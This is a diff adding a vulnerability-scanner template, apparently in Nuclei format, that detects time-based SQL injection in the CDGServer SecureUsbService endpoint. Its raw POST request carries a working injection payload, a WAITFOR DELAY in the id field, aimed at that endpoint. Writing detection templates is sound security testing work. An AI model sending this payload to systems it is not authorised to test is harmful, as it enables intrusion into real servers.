@@ -1,0 +1,28 @@
+id: cdgserver-sql-injection
+
+info:
+  name: SQL Injection in CDGServer SecureUsbService
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects a time-based SQL Injection vulnerability in the SecureUsbService endpoint of CDGServer.
+  tags: sql,injection,time-based
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/device/SecureUsbService;login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        command=DelSecureUsb&id=a';WAITFOR+DELAY+'0:0:5'--
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration >= 5000"
